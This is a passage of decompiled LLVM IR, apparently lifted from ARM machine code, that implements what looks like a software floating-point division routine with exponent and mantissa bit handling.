  %v3_153dc = mul i32 %v1_153bc, 4096
  store i32 %v3_153dc, i32* %r1.global-to-local, align 4
  br i1 %v7_153d8, label %dec_label_pc_15518, label %dec_label_pc_153e4

dec_label_pc_153e4:                               ; preds = %dec_label_pc_153d0
  %tmp92 = mul i32 %arg4, 256
  %v4_153ec = and i32 %tmp92, 268435200
  %v4_153f0 = udiv i32 %arg3, 16777216
  %v5_153ec = or i32 %v4_153f0, %v4_153ec
  %v5_153f0 = or i32 %v5_153ec, 268435456
  store i32 %v5_153f0, i32* %r3.global-to-local, align 4
  %v3_153f4 = mul i32 %arg3, 256
  store i32 %v3_153f4, i32* %r2.global-to-local, align 4
  %tmp93 = mul i32 %v1_153bc, 256
  %v4_153f8 = and i32 %tmp93, 268435200
  %v1_153fc = load i32, i32* @r0, align 4
  %v4_153fc = udiv i32 %v1_153fc, 16777216
  %v5_153f8 = or i32 %v4_153f8, %v4_153fc
  %v5_153fc = or i32 %v5_153f8, 268435456
  store i32 %v5_153fc, i32* %r5.global-to-local, align 4
  %v3_15400 = mul i32 %v1_153fc, 256
  store i32 %v3_15400, i32* %r6.global-to-local, align 4
  %v1_15404 = and i32 %v2_153d4, -2147483648
  store i32 %v1_15404, i32* %r1.global-to-local, align 4
  %v3_15408 = icmp uge i32 %v5_153fc, %v5_153f0
  %v9_15408 = icmp eq i32 %v5_153fc, %v5_153f0
  br i1 %v9_15408, label %bb94, label %bb95

bb94:                                             ; preds = %dec_label_pc_153e4
  %v4_1540c = icmp uge i32 %v3_15400, %v3_153f4
  br label %bb95

bb95:                                             ; preds = %dec_label_pc_153e4, %bb94
  %v1_15410 = phi i1 [ %v3_15408, %dec_label_pc_153e4 ], [ %v4_1540c, %bb94 ]
  %v2_15410 = add nsw i32 %v2_153d0, 253
  %v3_15410 = zext i1 %v1_15410 to i32
  %v4_15410 = add nsw i32 %v2_15410, %v3_15410
  %v8_15410 = icmp ule i32 %v4_15410, %v2_153d0
  %v9_15410 = icmp ugt i32 %v2_153d0, -254
  %v10_15410 = select i1 %v1_15410, i1 %v8_15410, i1 %v9_15410
  %v1_15414 = add nsw i32 %v4_15410, 768
  store i32 %v1_15414, i32* %r4.global-to-local, align 4
  br i1 %v10_15410, label %dec_label_pc_15424, label %dec_label_pc_1541c

dec_label_pc_1541c:                               ; preds = %bb95
  %v3_1541c = udiv i32 %v5_153f0, 2
  store i32 %v3_1541c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15424

dec_label_pc_15424:                               ; preds = %bb95, %dec_label_pc_1541c
  %v0_1542c = phi i32 [ %v5_153f0, %bb95 ], [ %v3_1541c, %dec_label_pc_1541c ]
  %v0_15430 = phi i32 [ %v3_153f4, %bb95 ], [ 0, %dec_label_pc_1541c ]
  %v2_15424 = sub i32 %v3_15400, %v0_15430
  store i32 %v2_15424, i32* %r6.global-to-local, align 4
  %v3_15424 = icmp uge i32 %v3_15400, %v0_15430
  %v3_15428 = icmp eq i1 %v3_15424, false
  %v4_15428 = sub nsw i32 %v5_153fc, %v0_1542c
  %v6_15428 = sext i1 %v3_15428 to i32
  %v7_15428 = add nsw i32 %v6_15428, %v4_15428
  store i32 %v7_15428, i32* %r5.global-to-local, align 4
  %v3_1542c = udiv i32 %v0_1542c, 2
  store i32 %v3_1542c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1543c.outer

dec_label_pc_1543c.outer:                         ; preds = %dec_label_pc_154d4, %dec_label_pc_15424
  %v1_154e8.ph = phi i32 [ %v2_154d4, %dec_label_pc_154d4 ], [ %v1_15404, %dec_label_pc_15424 ]
  %v0_15440.ph = phi i32 [ %v5_154b0, %dec_label_pc_154d4 ], [ %v7_15428, %dec_label_pc_15424 ]
  %v1_15444.ph = phi i32 [ %v3_154b4, %dec_label_pc_154d4 ], [ %v2_15424, %dec_label_pc_15424 ]
  %v5_154bc17.ph = phi i32 [ %v5_154bc, %dec_label_pc_154d4 ], [ %v3_1542c, %dec_label_pc_15424 ]
  %v3_154c013.ph = phi i32 [ %v3_154c0, %dec_label_pc_154d4 ], [ 0, %dec_label_pc_15424 ]
  %storemerge133 = phi i32 [ 0, %dec_label_pc_154d4 ], [ 1048576, %dec_label_pc_15424 ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_154d4 ], [ 524288, %dec_label_pc_15424 ]
  store i32 %storemerge133, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1543c

dec_label_pc_1543c:                               ; preds = %dec_label_pc_1543c.outer, %dec_label_pc_154ac
  %v1_154a059 = phi i32 [ %v2_154e8, %dec_label_pc_154ac ], [ %storemerge133, %dec_label_pc_1543c.outer ]
  %v1_1544c = phi i32 [ %v1_1544c32, %dec_label_pc_154ac ], [ %storemerge133, %dec_label_pc_1543c.outer ]
  %v1_1546841 = phi i32 [ %v1_1546843, %dec_label_pc_154ac ], [ %storemerge133, %dec_label_pc_1543c.outer ]
  %v1_1548450 = phi i32 [ %v1_1548452, %dec_label_pc_154ac ], [ %storemerge133, %dec_label_pc_1543c.outer ]
  %v0_154c4 = phi i32 [ %v3_154c4, %dec_label_pc_154ac ], [ %storemerge, %dec_label_pc_1543c.outer ]
  %v0_15440 = phi i32 [ %v5_154b0, %dec_label_pc_154ac ], [ %v0_15440.ph, %dec_label_pc_1543c.outer ]
  %v1_15444 = phi i32 [ %v3_154b4, %dec_label_pc_154ac ], [ %v1_15444.ph, %dec_label_pc_1543c.outer ]
  %v5_154bc17 = phi i32 [ %v5_154bc, %dec_label_pc_154ac ], [ %v5_154bc17.ph, %dec_label_pc_1543c.outer ]
  %v3_154c013 = phi i32 [ %v3_154c0, %dec_label_pc_154ac ], [ %v3_154c013.ph, %dec_label_pc_1543c.outer ]
  %v3_1543c = icmp uge i32 %v1_15444, %v3_154c013
  %v3_15440 = icmp eq i1 %v3_1543c, false
  %v4_15440 = sub i32 %v0_15440, %v5_154bc17
  %v6_15440 = sext i1 %v3_15440 to i32
  %v7_15440 = add i32 %v6_15440, %v4_15440
  %v8_15440 = zext i1 %v3_15440 to i32
  %v9_15440 = sub i32 %v7_15440, %v8_15440
  %v10_15440 = icmp ult i32 %v0_15440, %v9_15440
  %v11_15440 = icmp ne i32 %v5_154bc17, -1
  %v12_15440 = or i1 %v11_15440, %v10_15440
  %v13_15440 = icmp ult i32 %v0_15440, %v5_154bc17
  %v14_15440 = select i1 %v3_15440, i1 %v12_15440, i1 %v13_15440
  br i1 %v14_15440, label %.thread4, label %bb96

bb96:                                             ; preds = %dec_label_pc_1543c
  %v3_15444 = sub i32 %v1_15444, %v3_154c013
  store i32 %v3_15444, i32* %r6.global-to-local, align 4
  store i32 %v7_15440, i32* %r5.global-to-local, align 4
  %v3_1544c = or i32 %v1_1544c, %v0_154c4
  store i32 %v3_1544c, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1543c, %bb96
  %v1_154a058 = phi i32 [ %v1_154a059, %dec_label_pc_1543c ], [ %v3_1544c, %bb96 ]
  %v1_1544c35 = phi i32 [ %v1_1544c, %dec_label_pc_1543c ], [ %v3_1544c, %bb96 ]
  %v1_15468 = phi i32 [ %v1_1546841, %dec_label_pc_1543c ], [ %v3_1544c, %bb96 ]
  %v1_1548449 = phi i32 [ %v1_1548450, %dec_label_pc_1543c ], [ %v3_1544c, %bb96 ]
  %v0_1545c = phi i32 [ %v0_15440, %dec_label_pc_1543c ], [ %v7_15440, %bb96 ]
  %v1_15460 = phi i32 [ %v1_15444, %dec_label_pc_1543c ], [ %v3_15444, %bb96 ]
  %v1_15450 = urem i32 %v5_154bc17, 2
  %v2_15450 = icmp ne i32 %v1_15450, 0
  %v3_15450 = udiv i32 %v5_154bc17, 2
  %v3_15454 = zext i1 %v2_15450 to i32
  %v6_15454 = zext i32 %v3_154c013 to i64
  %v7_15454 = sub i32 33, %v3_154c013
  %v8_15454 = zext i32 %v7_15454 to i64
  %v9_15454 = shl i64 %v6_15454, %v8_15454
  %v10_15454 = sub i32 32, %v3_154c013
  %v11_15454 = shl i32 %v3_15454, %v10_15454
  %v12_15454 = zext i32 %v11_15454 to i64
  %v14_15454 = or i64 %v12_15454, %v9_15454
  %v15_15454 = trunc i64 %v14_15454 to i32
  %v3_15458 = icmp uge i32 %v1_15460, %v15_15454
  %v3_1545c = icmp eq i1 %v3_15458, false
  %v4_1545c = sub i32 %v0_1545c, %v3_15450
  %v6_1545c = sext i1 %v3_1545c to i32
  %v7_1545c = add i32 %v6_1545c, %v4_1545c
  %v13_1545c = icmp ult i32 %v0_1545c, %v3_15450
  %v14_1545c = or i1 %v13_1545c, %v3_1545c
  br i1 %v14_1545c, label %.thread6, label %bb97

bb97:                                             ; preds = %.thread4
  %v3_15460 = sub i32 %v1_15460, %v15_15454
  store i32 %v3_15460, i32* %r6.global-to-local, align 4
  store i32 %v7_1545c, i32* %r5.global-to-local, align 4
  %v5_15468 = udiv i32 %v0_154c4, 2
  %v6_15468 = or i32 %v1_15468, %v5_15468
  store i32 %v6_15468, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb97
  %v1_154a057 = phi i32 [ %v1_154a058, %.thread4 ], [ %v6_15468, %bb97 ]
  %v1_1544c34 = phi i32 [ %v1_1544c35, %.thread4 ], [ %v6_15468, %bb97 ]
  %v1_1546845 = phi i32 [ %v1_15468, %.thread4 ], [ %v6_15468, %bb97 ]
  %v1_15484 = phi i32 [ %v1_1548449, %.thread4 ], [ %v6_15468, %bb97 ]
  %v0_15478 = phi i32 [ %v0_1545c, %.thread4 ], [ %v7_1545c, %bb97 ]
  %v1_1547c = phi i32 [ %v1_15460, %.thread4 ], [ %v3_15460, %bb97 ]
  %v1_1546c = urem i32 %v3_15450, 2
  %v2_1546c = icmp ne i32 %v1_1546c, 0
  %v3_1546c = udiv i32 %v5_154bc17, 4
  %v3_15470 = zext i1 %v2_1546c to i32
  %v6_15470 = and i64 %v14_15454, 4294967295
  %v7_15470 = sub i32 33, %v15_15454
  %v8_15470 = zext i32 %v7_15470 to i64
  %v9_15470 = shl i64 %v6_15470, %v8_15470
  %v10_15470 = sub i32 32, %v15_15454
  %v11_15470 = shl i32 %v3_15470, %v10_15470
  %v12_15470 = zext i32 %v11_15470 to i64
  %v14_15470 = or i64 %v12_15470, %v9_15470
  %v15_15470 = trunc i64 %v14_15470 to i32
  %v3_15474 = icmp uge i32 %v1_1547c, %v15_15470
  %v3_15478 = icmp eq i1 %v3_15474, false
  %v4_15478 = sub i32 %v0_15478, %v3_1546c
  %v6_15478 = sext i1 %v3_15478 to i32
  %v7_15478 = add i32 %v6_15478, %v4_15478
  %v13_15478 = icmp ult i32 %v0_15478, %v3_1546c
  %v14_15478 = or i1 %v13_15478, %v3_15478
  br i1 %v14_15478, label %.thread8, label %bb98

bb98:                                             ; preds = %.thread6
  %v3_1547c = sub i32 %v1_1547c, %v15_15470
  store i32 %v3_1547c, i32* %r6.global-to-local, align 4
  store i32 %v7_15478, i32* %r5.global-to-local, align 4
  %v5_15484 = udiv i32 %v0_154c4, 4
  %v6_15484 = or i32 %v1_15484, %v5_15484
  store i32 %v6_15484, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb98
  %v1_154a0 = phi i32 [ %v1_154a057, %.thread6 ], [ %v6_15484, %bb98 ]
  %v1_1544c33 = phi i32 [ %v1_1544c34, %.thread6 ], [ %v6_15484, %bb98 ]
  %v1_1546844 = phi i32 [ %v1_1546845, %.thread6 ], [ %v6_15484, %bb98 ]
  %v1_1548453 = phi i32 [ %v1_15484, %.thread6 ], [ %v6_15484, %bb98 ]
  %v0_15494 = phi i32 [ %v0_15478, %.thread6 ], [ %v7_15478, %bb98 ]
  %v1_15498 = phi i32 [ %v1_1547c, %.thread6 ], [ %v3_1547c, %bb98 ]
  %v1_15488 = urem i32 %v3_1546c, 2
  %v2_15488 = icmp ne i32 %v1_15488, 0
  %v3_15488 = udiv i32 %v5_154bc17, 8
  %v3_1548c = zext i1 %v2_15488 to i32
  %v6_1548c = and i64 %v14_15470, 4294967295
  %v7_1548c = sub i32 33, %v15_15470
  %v8_1548c = zext i32 %v7_1548c to i64
  %v9_1548c = shl i64 %v6_1548c, %v8_1548c
  %v10_1548c = sub i32 32, %v15_15470
  %v11_1548c = shl i32 %v3_1548c, %v10_1548c
  %v12_1548c = zext i32 %v11_1548c to i64
  %v14_1548c = or i64 %v12_1548c, %v9_1548c
  %v15_1548c = trunc i64 %v14_1548c to i32
  %v3_15490 = icmp uge i32 %v1_15498, %v15_1548c
  %v3_15494 = icmp eq i1 %v3_15490, false
  %v4_15494 = sub i32 %v0_15494, %v3_15488
  %v6_15494 = sext i1 %v3_15494 to i32
  %v7_15494 = add i32 %v6_15494, %v4_15494
  %v13_15494 = icmp ult i32 %v0_15494, %v3_15488
  %v14_15494 = or i1 %v13_15494, %v3_15494
  br i1 %v14_15494, label %.thread10, label %bb100

bb100:                                            ; preds = %.thread8
  %v3_15498 = sub i32 %v1_15498, %v15_1548c
  store i32 %v3_15498, i32* %r6.global-to-local, align 4
  store i32 %v7_15494, i32* %r5.global-to-local, align 4
  %v5_154a0 = udiv i32 %v0_154c4, 8
  %v6_154a0 = or i32 %v1_154a0, %v5_154a0
  store i32 %v6_154a0, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb100
  %v1_154b0 = phi i32 [ %v1_15498, %.thread8 ], [ %v3_15498, %bb100 ]
  %v0_154ac = phi i32 [ %v0_15494, %.thread8 ], [ %v7_15494, %bb100 ]
  %v2_154e8 = phi i32 [ %v1_154a0, %.thread8 ], [ %v6_154a0, %bb100 ]
  %v1_1544c32 = phi i32 [ %v1_1544c33, %.thread8 ], [ %v6_154a0, %bb100 ]
  %v1_1546843 = phi i32 [ %v1_1546844, %.thread8 ], [ %v6_154a0, %bb100 ]
  %v1_1548452 = phi i32 [ %v1_1548453, %.thread8 ], [ %v6_154a0, %bb100 ]
  %v2_154a4 = or i32 %v0_154ac, %v1_154b0
  %v4_154a4 = icmp eq i32 %v2_154a4, 0
  br i1 %v4_154a4, label %dec_label_pc_154e4, label %dec_label_pc_154ac

dec_label_pc_154ac:                               ; preds = %.thread10
  %v3_154ac = mul i32 %v0_154ac, 16
  %v4_154b0 = udiv i32 %v1_154b0, 268435456
  %v5_154b0 = or i32 %v3_154ac, %v4_154b0
  store i32 %v5_154b0, i32* %r5.global-to-local, align 4
  %v3_154b4 = mul i32 %v1_154b0, 16
  store i32 %v3_154b4, i32* %r6.global-to-local, align 4
  %v3_154b8 = mul nuw i32 %v3_15488, 8
  %v4_154bc = udiv i32 %v15_1548c, 536870912
  %v5_154bc = or i32 %v4_154bc, %v3_154b8
  %v3_154c0 = mul i32 %v15_1548c, 8
  %v3_154c4 = udiv i32 %v0_154c4, 16
  store i32 %v3_154c4, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %v0_154c4, 16
  br i1 %tmp, label %dec_label_pc_154cc, label %dec_label_pc_1543c

dec_label_pc_154cc:                               ; preds = %dec_label_pc_154ac
  %v1_154cc = and i32 %v1_154e8.ph, 1048576
  %v2_154cc = icmp eq i32 %v1_154cc, 0
  br i1 %v2_154cc, label %dec_label_pc_154d4, label %.thread11.loopexit

dec_label_pc_154d4:                               ; preds = %dec_label_pc_154cc
  %v2_154d4 = or i32 %v2_154e8, %v1_154e8.ph
  store i32 %v2_154d4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1543c.outer

dec_label_pc_154e4:                               ; preds = %.thread10
  store i32 %v15_1548c, i32* %r2.global-to-local, align 4
  store i32 %v3_15488, i32* %r3.global-to-local, align 4
  %v1_154e4 = and i32 %v1_154e8.ph, 1048576
  %v2_154e4 = icmp eq i32 %v1_154e4, 0
  br i1 %v2_154e4, label %bb101, label %.thread11

bb101:                                            ; preds = %dec_label_pc_154e4
  %v3_154e8 = or i32 %v2_154e8, %v1_154e8.ph
  store i32 %v3_154e8, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_154cc
  store i32 %v3_154c0, i32* %r2.global-to-local, align 4
  store i32 %v5_154bc, i32* %r3.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_154e4, %bb101
  %v1_154f0 = add nsw i32 %v4_15410, 515
  store i32 %v1_154f0, i32* %ip.global-to-local, align 4
  %v2_154f0 = icmp ugt i32 %v1_15414, 252
  %v7_154f0 = icmp eq i32 %v1_15414, 253
  %v2_154f4 = xor i1 %v7_154f0, true
  %v3_154f4 = and i1 %v2_154f0, %v2_154f4
  br i1 %v3_154f4, label %bb102, label %bb103

bb102:                                            ; preds = %.thread11
  %v6_154f4 = icmp ugt i32 %v1_154f0, 1791
  %v11_154f4 = icmp eq i32 %v1_154f0, 1792
  br label %bb103

bb103:                                            ; preds = %.thread11, %bb102
  %v1_154f8 = phi i1 [ %v7_154f0, %.thread11 ], [ %v11_154f4, %bb102 ]
  %v0_154f8 = phi i1 [ %v2_154f0, %.thread11 ], [ %v6_154f4, %bb102 ]
  %v2_154f8 = xor i1 %v1_154f8, true
  %v3_154f8 = and i1 %v0_154f8, %v2_154f8
  call void @__pseudo_cond_branch(i1 %v3_154f8, i32 ptrtoint (i32* @global_var_1520c.448 to i32))
  %v0_154fc = load i32, i32* %r5.global-to-local, align 4
  %v1_154fc = load i32, i32* %r3.global-to-local, align 4
  %v2_154fc = sub i32 %v0_154fc, %v1_154fc
  store i32 %v2_154fc, i32* %ip.global-to-local, align 4
  %v3_154fc = icmp uge i32 %v0_154fc, %v1_154fc
  %v9_154fc = icmp eq i32 %v0_154fc, %v1_154fc
  br i1 %v9_154fc, label %bb104, label %.thread12

bb104:                                            ; preds = %bb103
  %v1_15500 = load i32, i32* %r6.global-to-local, align 4
  %v2_15500 = load i32, i32* %r2.global-to-local, align 4
  %v3_15500 = sub i32 %v1_15500, %v2_15500
  store i32 %v3_15500, i32* %ip.global-to-local, align 4
  %v4_15500 = icmp uge i32 %v1_15500, %v2_15500
  %v10_15500 = icmp eq i32 %v1_15500, %v2_15500
  br i1 %v10_15500, label %bb105, label %.thread12

bb105:                                            ; preds = %bb104
  %v1_15504 = load i32, i32* %r0.global-to-local, align 4
  %v2_15504 = urem i32 %v1_15504, 2
  %v3_15504 = icmp ne i32 %v2_15504, 0
  %v4_15504 = udiv i32 %v1_15504, 2
  store i32 %v4_15504, i32* %ip.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb103, %bb104, %bb105
  %v1_15508 = phi i1 [ %v3_154fc, %bb103 ], [ %v4_15500, %bb104 ], [ %v3_15504, %bb105 ]
  %v0_15508 = load i32, i32* %r0.global-to-local, align 4
  %v2_15508 = zext i1 %v1_15508 to i32
  %v3_15508 = add i32 %v2_15508, %v0_15508
  store i32 %v3_15508, i32* %r0.global-to-local, align 4
  %v0_1550c = load i32, i32* %r1.global-to-local, align 4
  %v1_1550c = load i32, i32* %r4.global-to-local, align 4
  %v2_1550c = and i32 %v1_1550c, 4096
  %v3_1550c = icmp ne i32 %v2_1550c, 0
  %v4_1550c = mul i32 %v1_1550c, 1048576
  %v6_1550c = add i32 %v4_1550c, %v0_1550c
  %v7_1550c = zext i1 %v3_1550c to i32
  %v8_1550c = add i32 %v7_1550c, %v6_1550c
  store i32 %v8_1550c, i32* %r1.global-to-local, align 4
  %v2_15510 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15510, i32* %r4.global-to-local, align 4
  store i32 %v6_153b0, i32* %r5.global-to-local, align 4
  store i32 %v9_153b0, i32* %r6.global-to-local, align 4
  ret i32 %v3_15508

dec_label_pc_15518:                               ; preds = %dec_label_pc_153d0
  %v1_15518 = and i32 %v2_153d4, -2147483648
  %v4_1551c = urem i32 %v1_153bc, 1048576
  %v5_1551c = or i32 %v1_15518, %v4_1551c
  store i32 %v5_1551c, i32* %r1.global-to-local, align 4
  %v6_15520 = add nsw i32 %v2_153d0, 1023
  store i32 %v6_15520, i32* %r4.global-to-local, align 4
  %v8_15520 = sub nsw i32 0, %v2_153d0
  %v9_15520 = and i32 %v6_15520, %v8_15520
  %v11_15520 = icmp slt i32 %v2_153d0, -1023
  %v12_15520 = icmp eq i32 %v6_15520, 0
  %v7_15524 = icmp sgt i32 %v2_153d0, -1023
  br i1 %v7_15524, label %bb106, label %bb107

bb106:                                            ; preds = %dec_label_pc_15518
  %v10_15524 = sub nsw i32 1024, %v2_153d0
  store i32 %v10_15524, i32* %r5.global-to-local, align 4
  %v14_15524 = and i32 %v10_15524, %v6_15520
  %v16_15524 = icmp slt i32 %v10_15524, 0
  %v17_15524 = icmp eq i32 %v6_15520, 2047
  br label %bb107

bb107:                                            ; preds = %dec_label_pc_15518, %bb106
  %v3_15530.in = phi i32 [ %v9_15520, %dec_label_pc_15518 ], [ %v14_15524, %bb106 ]
  %v2_15530 = phi i1 [ %v11_15520, %dec_label_pc_15518 ], [ %v16_15524, %bb106 ]
  %v1_15530 = phi i1 [ %v12_15520, %dec_label_pc_15518 ], [ %v17_15524, %bb106 ]
  %v3_15530 = icmp slt i32 %v3_15530.in, 0
  %v3_15528 = xor i1 %v3_15530, %v2_15530
  %v4_15528 = or i1 %v1_15530, %v3_15528
  br i1 %v4_15528, label %.thread, label %bb108

bb108:                                            ; preds = %bb107
  %v9_1552884 = mul i32 %v6_15520, 1048576
  %v10_1552885 = or i32 %v9_1552884, %v5_1551c
  store i32 %v10_1552885, i32* %r1.global-to-local, align 4
  store i32 %v3_153b0, i32* %r4.global-to-local, align 4
  store i32 %v6_153b0, i32* %r5.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb107, %bb108
  %v0_15530 = phi i32 [ %v12_153b0, %bb108 ], [ %v1_15518, %bb107 ]
  %v6_15530 = xor i1 %v4_15528, true
  call void @__pseudo_cond_branch(i1 %v6_15530, i32 %v0_15530)
  %v0_15534 = load i32, i32* %r1.global-to-local, align 4
  %v1_15534 = or i32 %v0_15534, 1048576
  store i32 %v1_15534, i32* @r1, align 4
  %v0_1553c = load i32, i32* %r4.global-to-local, align 4
  %v1_1553c = add i32 %v0_1553c, -1
  store i32 %v1_1553c, i32* @r4, align 4
  %v3_1553c = sub i32 0, %v0_1553c
  %v4_1553c = and i32 %v0_1553c, %v3_1553c
  %v5_1553c = icmp slt i32 %v4_1553c, 0
  store i1 %v5_1553c, i1* @cpsr_v, align 1
  %v6_1553c = icmp slt i32 %v1_1553c, 0
  store i1 %v6_1553c, i1* @cpsr_n, align 1
  %v7_1553c = icmp eq i32 %v0_1553c, 1
  store i1 %v7_1553c, i1* @cpsr_z, align 1
  %v0_15540 = call i32 @function_1520c()
  store i32 %v0_15540, i32* @r0, align 4
  %v0_15548 = call i32 @function_1520c()
  store i32 %v0_15548, i32* @r0, align 4
  %v0_1554c.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_15550.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1554c

dec_label_pc_1554c:                               ; preds = %.thread1, %.thread2, %bb91, %.thread
  %v4_1554c.pre-phi = phi i32 [ %v5_153c0, %.thread1 ], [ %.pre145.pre-phi, %.thread2 ], [ %v5_153c0, %bb91 ], [ %v5_153c0, %.thread ]
  %v0_15550 = phi i32 [ %v5_153bc, %.thread1 ], [ %v5_153bc, %.thread2 ], [ %v5_153bc, %bb91 ], [ %v0_15550.pre, %.thread ]
  %v2_15554 = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb91 ], [ %v0_1554c.pre, %.thread ]
  %v5_1554c = and i32 %v2_15554, %v4_1554c.pre-phi
  store i32 %v5_1554c, i32* @r5, align 4
  %v4_15550 = icmp eq i32 %v2_15554, %v0_15550
  br i1 %v4_15550, label %bb109, label %bb110

bb109:                                            ; preds = %dec_label_pc_1554c
  %v5_15554 = icmp eq i32 %v5_1554c, %v2_15554
  br label %bb110

bb110:                                            ; preds = %dec_label_pc_1554c, %bb109
  %v0_15558 = phi i1 [ false, %dec_label_pc_1554c ], [ %v5_15554, %bb109 ]
  call void @__pseudo_cond_branch(i1 %v0_15558, i32 ptrtoint (i32* @global_var_153a0.450 to i32))
  %v0_1555c = load i32, i32* @r4, align 4
  %v1_1555c = load i32, i32* %ip.global-to-local, align 4
  %v4_1555c = icmp eq i32 %v1_1555c, %v0_1555c
  br i1 %v4_1555c, label %dec_label_pc_15564, label %dec_label_pc_15580

dec_label_pc_15564:                               ; preds = %bb110
  %v0_15564 = load i32, i32* @r0, align 4
  %v1_15564 = load i32, i32* @r1, align 4
  %v4_15564 = mul i32 %v1_15564, 4096
  %v5_15564 = or i32 %v4_15564, %v0_15564
  store i32 %v5_15564, i32* %r4.global-to-local, align 4
  %v1_15568 = icmp ne i32 %v5_15564, 0
  call void @__pseudo_cond_branch(i1 %v1_15568, i32 ptrtoint (i32* @global_var_153a0.450 to i32))
  %v0_1556c = load i32, i32* @r5, align 4
  %v1_1556c = load i32, i32* %ip.global-to-local, align 4
  %v1_15570 = icmp ne i32 %v1_1556c, %v0_1556c
  call void @__pseudo_cond_branch(i1 %v1_15570, i32 ptrtoint (i32* @global_var_15384.451 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_1557c = call i32 @function_153a0(i32 %arg3, i32 %arg4)
  store i32 %v2_1557c, i32* @r0, align 4
  %v1_15580.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15580

dec_label_pc_15580:                               ; preds = %bb110, %dec_label_pc_15564
  %v1_15580 = phi i32 [ %v1_1555c, %bb110 ], [ %v1_15580.pre, %dec_label_pc_15564 ]
  %v0_15580 = load i32, i32* @r5, align 4
  %v4_15580 = icmp eq i32 %v0_15580, %v1_15580
  br i1 %v4_15580, label %dec_label_pc_15588, label %dec_label_pc_15580.dec_label_pc_1559c_crit_edge

dec_label_pc_15580.dec_label_pc_1559c_crit_edge:  ; preds = %dec_label_pc_15580
  %v0_1559c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1559c

dec_label_pc_15588:                               ; preds = %dec_label_pc_15580
  %v4_15588 = mul i32 %arg4, 4096
  %v5_15588 = or i32 %v4_15588, %arg3
  store i32 %v5_15588, i32* %r5.global-to-local, align 4
  %v7_15588 = icmp eq i32 %v5_15588, 0
  call void @__pseudo_cond_branch(i1 %v7_15588, i32 ptrtoint (i32* @global_var_15334.452 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_15598 = call i32 @function_153a0(i32 %arg3, i32 %arg4)
  store i32 %v2_15598, i32* @r0, align 4
  br label %dec_label_pc_1559c

dec_label_pc_1559c:                               ; preds = %dec_label_pc_15580.dec_label_pc_1559c_crit_edge, %dec_label_pc_15588
  %v0_1559c = phi i32 [ %v0_1559c.pre, %dec_label_pc_15580.dec_label_pc_1559c_crit_edge ], [ %v2_15598, %dec_label_pc_15588 ]
  %v1_1559c = load i32, i32* @r1, align 4
  %v3_1559c = mul i32 %v1_1559c, 2
  %v4_1559c = or i32 %v3_1559c, %v0_1559c
  store i32 %v4_1559c, i32* %r6.global-to-local, align 4
  %v6_1559c = icmp eq i32 %v4_1559c, 0
  br i1 %v6_1559c, label %dec_label_pc_1559c._crit_edge, label %bb111

dec_label_pc_1559c._crit_edge:                    ; preds = %dec_label_pc_1559c
  %.pre = mul i32 %arg4, 2
  %.pre80 = or i32 %.pre, %arg3
  br label %bb112

bb111:                                            ; preds = %dec_label_pc_1559c
  %v4_155a0 = mul i32 %arg4, 2
  %v5_155a0 = or i32 %v4_155a0, %arg3
  store i32 %v5_155a0, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_155a0, 0
  br label %bb112

bb112:                                            ; preds = %dec_label_pc_1559c._crit_edge, %bb111
  %v4_155b0.pre-phi = phi i32 [ %.pre80, %dec_label_pc_1559c._crit_edge ], [ %v5_155a0, %bb111 ]
  %v0_155a4 = phi i1 [ false, %dec_label_pc_1559c._crit_edge ], [ %phitmp, %bb111 ]
  call void @__pseudo_cond_branch(i1 %v0_155a4, i32 ptrtoint (i32* @global_var_152cc.453 to i32))
  %v0_155a8 = load i32, i32* @r0, align 4
  %v1_155a8 = load i32, i32* @r1, align 4
  %v3_155a8 = mul i32 %v1_155a8, 2
  %v4_155a8 = or i32 %v3_155a8, %v0_155a8
  store i32 %v4_155a8, i32* %r4.global-to-local, align 4
  %v1_155ac = icmp ne i32 %v4_155a8, 0
  call void @__pseudo_cond_branch(i1 %v1_155ac, i32 ptrtoint (i32* @global_var_15384.451 to i32))
  store i32 %v4_155b0.pre-phi, i32* %r5.global-to-local, align 4
  %v1_155b4 = icmp ne i32 %v4_155b0.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_155b4, i32 ptrtoint (i32* @global_var_15334.452 to i32))
  %v0_155b8 = load i32, i32* @r0, align 4
  %v1_155b8 = load i32, i32* @r1, align 4
  %v2_155b8 = call i32 @function_153a0(i32 %v0_155b8, i32 %v1_155b8)
  store i32 %v2_155b8, i32* %r0.global-to-local, align 4
  ret i32 %v2_155b8

; uselistorder directives
  uselistorder i32 %v5_155a0, { 1, 0, 2 }
  uselistorder i32 %v1_1555c, { 1, 0 }
  uselistorder i32 %v1_1553c, { 1, 0 }
  uselistorder i32 %v0_1553c, { 3, 1, 0, 2 }
  uselistorder i32 %v10_15524, { 2, 0, 1 }
